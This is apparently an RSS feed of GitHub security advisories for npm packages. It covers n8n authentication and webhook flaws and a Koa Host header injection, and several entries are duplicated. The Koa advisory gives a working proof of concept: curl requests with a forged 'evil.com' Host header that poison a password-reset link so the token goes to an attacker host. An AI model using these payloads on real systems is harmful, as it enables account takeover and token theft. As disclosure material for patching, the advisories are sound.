<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-02-27T04:31:16.614Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has Webhook Forgery on Zendesk Trigger Node]]></title>
        <id>https://github.com/advisories/GHSA-38c7-23hj-2wgq</id>
        <link href="https://github.com/advisories/GHSA-38c7-23hj-2wgq"/>
        <updated>2026-02-26T22:47:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker who knows the webhook URL of a workflow using the ZendeskTrigger node could send unsigned POST requests and trigger the workflow with arbitrary data. The node does not verify the HMAC-SHA256 signature that Zendesk attaches to every outbound webhook, allowing any party to inject crafted payloads into the connected workflow.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.6.2 and 1.123.18. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Restrict network access to the n8n webhook endpoint to known Zendesk IP ranges.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-38c7-23hj-2wgq">https://github.com/n8n-io/n8n/security/advisories/GHSA-38c7-23hj-2wgq</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/3839e310bd4c3002c646c363d1411916fa195151">https://github.com/n8n-io/n8n/commit/3839e310bd4c3002c646c363d1411916fa195151</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/c6520e4e87614fa60c9433e93019e211f19f65f9">https://github.com/n8n-io/n8n/commit/c6520e4e87614fa60c9433e93019e211f19f65f9</a></li>
<li><a href="https://github.com/advisories/GHSA-38c7-23hj-2wgq">https://github.com/advisories/GHSA-38c7-23hj-2wgq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38c7-23hj-2wgq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:47:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has Webhook Forgery on Zendesk Trigger Node]]></title>
        <id>https://github.com/advisories/GHSA-38c7-23hj-2wgq</id>
        <link href="https://github.com/advisories/GHSA-38c7-23hj-2wgq"/>
        <updated>2026-02-26T22:47:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker who knows the webhook URL of a workflow using the ZendeskTrigger node could send unsigned POST requests and trigger the workflow with arbitrary data. The node does not verify the HMAC-SHA256 signature that Zendesk attaches to every outbound webhook, allowing any party to inject crafted payloads into the connected workflow.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.6.2 and 1.123.18. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Restrict network access to the n8n webhook endpoint to known Zendesk IP ranges.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-38c7-23hj-2wgq">https://github.com/n8n-io/n8n/security/advisories/GHSA-38c7-23hj-2wgq</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/3839e310bd4c3002c646c363d1411916fa195151">https://github.com/n8n-io/n8n/commit/3839e310bd4c3002c646c363d1411916fa195151</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/c6520e4e87614fa60c9433e93019e211f19f65f9">https://github.com/n8n-io/n8n/commit/c6520e4e87614fa60c9433e93019e211f19f65f9</a></li>
<li><a href="https://github.com/advisories/GHSA-38c7-23hj-2wgq">https://github.com/advisories/GHSA-38c7-23hj-2wgq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38c7-23hj-2wgq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:47:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has a Guardrail Node Bypass]]></title>
        <id>https://github.com/advisories/GHSA-fvfv-ppw4-7h2w</id>
        <link href="https://github.com/advisories/GHSA-fvfv-ppw4-7h2w"/>
        <updated>2026-02-26T22:46:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An end user interacting with a workflow that uses the Guardrail node could craft an input that bypasses the default guardrail instructions.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n version 2.10.0. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit access to trusted users.</li>
<li>Review asses the practical impact of guardrail bypasses in your usecase and adjust your workflow accordingly.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-fvfv-ppw4-7h2w">https://github.com/n8n-io/n8n/security/advisories/GHSA-fvfv-ppw4-7h2w</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/8d0251d1deef256fd3d9176f05dedab62afde918">https://github.com/n8n-io/n8n/commit/8d0251d1deef256fd3d9176f05dedab62afde918</a></li>
<li><a href="https://github.com/n8n-io/n8n/releases/tag/n8n@2.10.0">https://github.com/n8n-io/n8n/releases/tag/n8n@2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-fvfv-ppw4-7h2w">https://github.com/advisories/GHSA-fvfv-ppw4-7h2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fvfv-ppw4-7h2w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:46:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has an Authentication Bypass in its Chat Trigger Node]]></title>
        <id>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</id>
        <link href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw"/>
        <updated>2026-02-26T22:45:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>When the Chat Trigger node is configured with n8n User Auth authentication, the authentication check could be circumvented. </p>
<ul>
<li>This issue requires the Chat Trigger node to be configured with n8n User Auth authentication (non-default).</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.10.1, 2.9.3, and 1.123.22. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use a different authentication method for the Chat Trigger node, or restrict network access to the webhook endpoint to trusted origins.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a">https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6">https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e">https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e</a></li>
<li><a href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has an Authentication Bypass in its Chat Trigger Node]]></title>
        <id>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</id>
        <link href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw"/>
        <updated>2026-02-26T22:45:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>When the Chat Trigger node is configured with n8n User Auth authentication, the authentication check could be circumvented. </p>
<ul>
<li>This issue requires the Chat Trigger node to be configured with n8n User Auth authentication (non-default).</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.10.1, 2.9.3, and 1.123.22. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use a different authentication method for the Chat Trigger node, or restrict network access to the webhook endpoint to trusted origins.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a">https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6">https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e">https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e</a></li>
<li><a href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has an Authentication Bypass in its Chat Trigger Node]]></title>
        <id>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</id>
        <link href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw"/>
        <updated>2026-02-26T22:45:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>When the Chat Trigger node is configured with n8n User Auth authentication, the authentication check could be circumvented. </p>
<ul>
<li>This issue requires the Chat Trigger node to be configured with n8n User Auth authentication (non-default).</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.10.1, 2.9.3, and 1.123.22. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use a different authentication method for the Chat Trigger node, or restrict network access to the webhook endpoint to trusted origins.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/n8n-io/n8n/security/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a">https://github.com/n8n-io/n8n/commit/062644ef786b6af480afe4a0f12bc6d70040534a</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6">https://github.com/n8n-io/n8n/commit/1479aab2d32fe0ee087f82b9038b1035c98be2f6</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e">https://github.com/n8n-io/n8n/commit/9e5212ecbc5d2d4e6f340b636a5e84be6369882e</a></li>
<li><a href="https://github.com/advisories/GHSA-jh8h-6c9q-7gmw">https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh8h-6c9q-7gmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has an SSO Enforcement Bypass in its Self-Service Settings API]]></title>
        <id>https://github.com/advisories/GHSA-vjf3-2gpj-233v</id>
        <link href="https://github.com/advisories/GHSA-vjf3-2gpj-233v"/>
        <updated>2026-02-26T22:45:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user signed in through Single Sign-On (SSO) could disable SSO enforcement for their own account through the n8n API. This allowed the user to create a local password and authenticate directly with email and password, completely bypassing the organization's SSO policy, centralized identity management, and any identity-provider-enforced multi-factor authentication.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n version 2.8.0. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Monitor audit logs for users who create local credentials after authenticating via SSO.</li>
<li>Restrict the n8n instance to fully trusted users only.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-vjf3-2gpj-233v">https://github.com/n8n-io/n8n/security/advisories/GHSA-vjf3-2gpj-233v</a></li>
<li><a href="https://github.com/n8n-io/n8n/commit/a70b2ea379086da3de103bb84811e88cadf29976">https://github.com/n8n-io/n8n/commit/a70b2ea379086da3de103bb84811e88cadf29976</a></li>
<li><a href="https://github.com/n8n-io/n8n/releases/tag/n8n@2.8.0">https://github.com/n8n-io/n8n/releases/tag/n8n@2.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vjf3-2gpj-233v">https://github.com/advisories/GHSA-vjf3-2gpj-233v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjf3-2gpj-233v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-26T22:45:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Koa has Host Header Injection via ctx.hostname]]></title>
        <id>https://github.com/advisories/GHSA-7gcc-r8m5-44qm</id>
        <link href="https://github.com/advisories/GHSA-7gcc-r8m5-44qm"/>
        <updated>2026-02-26T22:42:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Koa's <code>ctx.hostname</code> API performs naive parsing of the HTTP Host header, extracting everything before the first colon without validating the input conforms to RFC 3986 hostname syntax. When a malformed Host header containing a <code>@</code> symbol (e.g., <code>evil.com:fake@legitimate.com</code>) is received, <code>ctx.hostname</code> returns <code>evil.com</code> - an attacker-controlled value. Applications using <code>ctx.hostname</code> for URL generation, password reset links, email verification URLs, or routing decisions are vulnerable to Host header injection attacks.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in Koa's hostname getter in <code>lib/request.js</code>:</p>
<pre><code class="language-javascript">// Koa 2.16.1 - lib/request.js
get hostname() {
  const host = this.host;
  if (!host) return '';
  if ('[' === host[0]) return this.URL.hostname || ''; // IPv6 literal
  return host.split(':', 1)[0];
}
</code></pre>
<p>The <code>host</code> getter retrieves the raw header value with HTTP/2 and proxy support:</p>
<pre><code class="language-javascript">// Koa 2.16.1 - lib/request.js
get host() {
  const proxy = this.app.proxy;
  let host = proxy &amp;&amp; this.get('X-Forwarded-Host');
  if (!host) {
    if (this.req.httpVersionMajor &gt;= 2) host = this.get(':authority');
    if (!host) host = this.get('Host');
  }
  if (!host) return '';
  return host.split(',')[0].trim();
}
</code></pre>
<h3 id="the-problem">The Problem</h3>
<p>The parsing logic simply splits on the first <code>:</code> and returns the first segment. There is no validation that the resulting string is a valid hostname per RFC 3986 Section 3.2.2.</p>
<p><strong>RFC 3986 Section 3.2.2</strong> defines the host component as:</p>
<pre><code>host = IP-literal / IPv4address / reg-name
reg-name = *( unreserved / pct-encoded / sub-delims )
unreserved = ALPHA / DIGIT / "-" / "." / "_" / "~"
sub-delims = "!" / "$" / "&amp;" / "'" / "(" / ")" / "*" / "+" / "," / ";" / "="
</code></pre>
<p>The <code>@</code> character is explicitly NOT permitted in the host component - it is the delimiter separating userinfo from host in the authority component.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>When an attacker sends:</p>
<pre><code>Host: evil.com:fake@legitimate.com:3000
</code></pre>
<p>Koa parses this as:</p>
<table>
<thead>
<tr>
<th>API</th>
<th>Returns</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td><code>ctx.get('Host')</code></td>
<td><code>"evil.com:fake@legitimate.com:3000"</code></td>
<td>Raw header</td>
</tr>
<tr>
<td><code>ctx.hostname</code></td>
<td><code>"evil.com"</code></td>
<td><strong>Attacker-controlled</strong></td>
</tr>
<tr>
<td><code>ctx.host</code></td>
<td><code>"evil.com:fake@legitimate.com:3000"</code></td>
<td>Raw header value</td>
</tr>
<tr>
<td><code>ctx.origin</code></td>
<td><code>"http://evil.com:fake@legitimate.com:3000"</code></td>
<td>Protocol + malformed host</td>
</tr>
</tbody></table>
<p>The <code>ctx.hostname</code> API returns <code>evil.com</code> because the parser splits on the first <code>:</code> without understanding that <code>evil.com:fake@legitimate.com</code> is a malformed authority component where <code>evil.com:fake</code> would be interpreted as userinfo by a proper URI parser.</p>
<h3 id="additional-concern-ctxorigin">Additional Concern: <code>ctx.origin</code></h3>
<p>Koa's <code>ctx.origin</code> property concatenates protocol and host without validation:</p>
<pre><code class="language-javascript">// lib/request.js
get origin() {
  return `${this.protocol}://${this.host}`;
}
</code></pre>
<p>Applications using <code>ctx.origin</code> for URL generation receive the full malformed Host header value, creating URLs with embedded credentials that browsers may interpret as userinfo.</p>
<h3 id="http2-consideration">HTTP/2 Consideration</h3>
<p>Koa explicitly checks <code>httpVersionMajor &gt;= 2</code> to read the <code>:authority</code> pseudo-header:</p>
<pre><code class="language-javascript">if (this.req.httpVersionMajor &gt;= 2) host = this.get(':authority');
</code></pre>
<p>The same vulnerability applies - malformed <code>:authority</code> values containing userinfo would be accepted and parsed identically.</p>
<h2 id="poc">PoC</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-javascript">// server.js
const Koa = require('koa'); 
const app = new Koa();

// Simulates password reset URL generation (common vulnerable pattern)
app.use(async ctx =&gt; {
  if (ctx.path === '/forgot-password') {
    const resetToken = 'abc123securtoken';
    const resetUrl = `${ctx.protocol}://${ctx.hostname}/reset?token=${resetToken}`;
    
    ctx.body = {
      message: 'Password reset link generated',
      resetUrl: resetUrl,
      debug: {
        rawHost: ctx.get('Host'),
        parsedHostname: ctx.hostname,
        origin: ctx.origin,
        protocol: ctx.protocol
      }
    };
  }
});

app.listen(3000, () =&gt; console.log('Server on http://localhost:3000'));
</code></pre>
<h3 id="exploit">Exploit</h3>
<pre><code class="language-bash">curl -H "Host: evil.com:fake@localhost:3000" http://localhost:3000/forgot-password
</code></pre>
<h3 id="result">Result</h3>
<pre><code class="language-json">{
  "message": "Password reset link generated",
  "resetUrl": "http://evil.com/reset?token=abc123securtoken",
  "debug": {
    "rawHost": "evil.com:fake@localhost:3000",
    "parsedHostname": "evil.com",
    "origin": "http://evil.com:fake@localhost:3000",
    "protocol": "http"
  }
}
</code></pre>
<p>The password reset URL points to <code>evil.com</code> instead of the legitimate server. In a real attack:</p>
<ol>
<li>Attacker requests password reset for victim's email with malicious Host header</li>
<li>Server generates reset link using <code>ctx.hostname</code> → <code>https://evil.com/reset?token=SECRET</code></li>
<li>Victim receives email with poisoned link</li>
<li>Victim clicks link, token is sent to attacker's server</li>
<li>Attacker uses token to reset victim's password</li>
</ol>
<h3 id="additional-test-cases">Additional Test Cases</h3>
<pre><code class="language-bash"># Basic injection
curl -H "Host: evil.com:x@legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"

# With port preservation attempt
curl -H "Host: evil.com:443@legitimate.com:3000" http://localhost:3000/forgot-password  
# Result: hostname = "evil.com"

# Unicode/encoded variations
curl -H "Host: evil.com:x%40legitimate.com" http://localhost:3000/forgot-password
# Result: hostname = "evil.com"
</code></pre>
<h3 id="deployment-consideration">Deployment Consideration</h3>
<p>For this attack to succeed in production, the malicious Host header must reach the Koa application. This occurs when:</p>
<ol>
<li><strong>No reverse proxy</strong> - Application directly exposed to internet</li>
<li><strong>Misconfigured proxy</strong> - Proxy doesn't override/validate Host header</li>
<li><strong>Proxy trust enabled</strong> (<code>app.proxy = true</code>) - <code>X-Forwarded-Host</code> can be injected</li>
<li><strong>Default virtual host</strong> - Server is the catch-all for unrecognized Host headers</li>
</ol>
<h2 id="impact">Impact</h2>
<h3 id="vulnerability-type">Vulnerability Type</h3>
<ul>
<li>CWE-20: Improper Input Validation</li>
<li>CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax</li>
</ul>
<h3 id="attack-scenarios">Attack Scenarios</h3>
<p><strong>1. Password Reset Poisoning (High Severity)</strong></p>
<ul>
<li>Attacker hijacks password reset tokens by poisoning reset URLs</li>
<li>Requires victim to click link in email</li>
<li>Results in account takeover</li>
</ul>
<p><strong>2. Email Verification Bypass</strong></p>
<ul>
<li>Attacker poisons email verification links</li>
<li>Can verify attacker-controlled email on victim accounts</li>
</ul>
<p><strong>3. OAuth/SSO Callback Manipulation</strong></p>
<ul>
<li>Applications using <code>ctx.hostname</code> for OAuth redirect URIs</li>
<li>Attacker redirects OAuth callbacks to malicious server</li>
<li>Results in token theft</li>
</ul>
<p><strong>4. Web Cache Poisoning</strong></p>
<ul>
<li>If responses are cached without Host in cache key</li>
<li>Poisoned URLs served to all users</li>
<li>Persistent XSS/phishing via cached responses</li>
</ul>
<p><strong>5. Server-Side Request Forgery (SSRF)</strong></p>
<ul>
<li>Internal routing decisions based on <code>ctx.hostname</code></li>
<li>Attacker manipulates which backend receives requests</li>
</ul>
<h3 id="who-is-impacted">Who Is Impacted</h3>
<ul>
<li><strong>Direct impact</strong>: Any Koa application using <code>ctx.hostname</code> or <code>ctx.origin</code> for URL generation without additional validation</li>
<li><strong>Common patterns</strong>: Password reset, email verification, webhook URL generation, multi-tenant routing, OAuth implementations</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm">https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27959">https://nvd.nist.gov/vuln/detail/CVE-2026-27959</a></li>
<li><a href="https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df">https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df</a></li>
<li><a href="https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb">https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb</a></li>
<li><a href="https://github.com/advisories/GHSA-7gcc-r8m5-44qm">https://github.com/advisories/GHSA-7gcc-r8m5-44qm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gcc-r8m5-44qm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:42:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Koa has Host Header Injection via ctx.hostname]]></title>
        <id>https://github.com/advisories/GHSA-7gcc-r8m5-44qm</id>
        <link href="https://github.com/advisories/GHSA-7gcc-r8m5-44qm"/>
        <updated>2026-02-26T22:42:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Koa's <code>ctx.hostname</code> API performs naive parsing of the HTTP Host header, extracting everything before the first colon without validating the input conforms to RFC 3986 hostname syntax. When a malformed Host header containing a <code>@</code> symbol (e.g., <code>evil.com:fake@legitimate.com</code>) is received, <code>ctx.hostname</code> returns <code>evil.com</code> - an attacker-controlled value. Applications using <code>ctx.hostname</code> for URL generation, password reset links, email verification URLs, or routing decisions are vulnerable to Host header injection attacks.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in Koa's hostname getter in <code>lib/request.js</code>:</p>
<pre><code class="language-javascript">// Koa 2.16.1 - lib/request.js
get hostname() {
  const host = this.host;
  if (!host) return '';
  if ('[' === host[0]) return this.URL.hostname || ''; // IPv6 literal
  return host.split(':', 1)[0];
}
</code></pre>
<p>The <code>host</code> getter retrieves the raw header value with HTTP/2 and proxy support:</p>
<pre><code class="language-javascript">// Koa 2.16.1 - lib/request.js
get host() {
  const proxy = this.app.proxy;
  let host = proxy &amp;&amp; this.get('X-Forwarded-Host');
  if (!host) {
    if (this.req.httpVersionMajor &gt;= 2) host = this.get(':authority');
    if (!host) host = this.get('Host');
  }
  if (!host) return '';
  return host.split(',')[0].trim();
}
</code></pre>
<h3 id="the-problem">The Problem</h3>
<p>The parsing logic simply splits on the first <code>:</code> and returns the first segment. There is no validation that the resulting string is a valid hostname per RFC 3986 Section 3.2.2.</p>
<p><strong>RFC 3986 Section 3.2.2</strong> defines the host component as:</p>
<pre><code>host = IP-literal / IPv4address / reg-name
reg-name = *( unreserved / pct-encoded / sub-delims )
unreserved = ALPHA / DIGIT / "-" / "." / "_" / "~"
sub-delims = "!" / "$" / "&amp;" / "'" / "(" / ")" / "*" / "+" / "," / ";" / "="
</code></pre>
<p>The <code>@</code> character is explicitly NOT permitted in the host component - it is the delimiter separating userinfo from host in the authority component.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>When an attacker sends:</p>
<pre><code>Host: evil.com:fake@legitimate.com:3000
</code></pre>
<p>Koa parses this as:</p>
<table>
<thead>
<tr>
<th>API</th>
<th>Returns</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td><code>ctx.get('Host')</code></td>
<td><code>"evil.com:fake@legitimate.com:3000"</code></td>
<td>Raw header</td>
</tr>
<tr>
<td><code>ctx.hostname</code></td>
<td><code>"evil.com"</code></td>
<td><strong>Attacker-controlled</strong></td>
</tr>
<tr>
<td><code>ctx.host</code></td>
<td><code>"evil.com:fake@legitimate.com:3000"</code></td>
<td>Raw header value</td>
</tr>
<tr>
<td><code>ctx.origin</code></td>
<td><code>"http://evil.com:fake@legitimate.com:3000"</code></td>
<td>Protocol + malformed host</td>
</tr>
</tbody></table>
<p>The <code>ctx.hostname</code> API returns <code>evil.com</code> because the parser splits on the first <code>:</code> without understanding that <code>evil.com:fake@legitimate.com</code> is a malformed authority component where <code>evil.com:fake</code> would be interpreted as userinfo by a proper URI parser.</p>
<h3 id="additional-concern-ctxorigin">Additional Concern: <code>ctx.origin</code></h3>
<p>Koa's <code>ctx.origin</code> property concatenates protocol and host without validation:</p>
<pre><code class="language-javascript">// lib/request.js
get origin() {
  return `${this.protocol}://${this.host}`;
}
</code></pre>
<p>Applications using <code>ctx.origin</code> for URL generation receive the full malformed Host header value, creating URLs with embedded credentials that browsers may interpret as userinfo.</p>
<h3 id="http2-consideration">HTTP/2 Consideration</h3>
<p>Koa explicitly checks <code>httpVersionMajor &gt;= 2</code> to read the <code>:authority</code> pseudo-header:</p>
<pre><code class="language-javascript">if (this.req.httpVersionMajor &gt;= 2) host = this.get(':authority');
</code></pre>
<p>The same vulnerability applies - malformed <code>:authority</code> values containing userinfo would be accepted and parsed identically.</p>
<h2 id="poc">PoC</h2>
<h3 id="setup">Setup</h3>
<pre><code class="language-javascript">// server.js
const Koa = require('koa'); 
const app = new Koa();

// Simulates password reset URL generation (common vulnerable pattern)
app.use(async ctx =&gt; {
  if (ctx.path === '/forgot-password') {
    const resetToken = 'abc123securtoken';
    const resetUrl = `${ctx.protocol}://${ctx.hostname}/reset?token=${resetToken}`;
    
    ctx.body = {
      message: 'Password reset link generated',
      resetUrl: resetUrl,
      debug: {
        rawHost: ctx.get('Host'),
        parsedHostname: ctx.hostname,
        origin: ctx.origin,
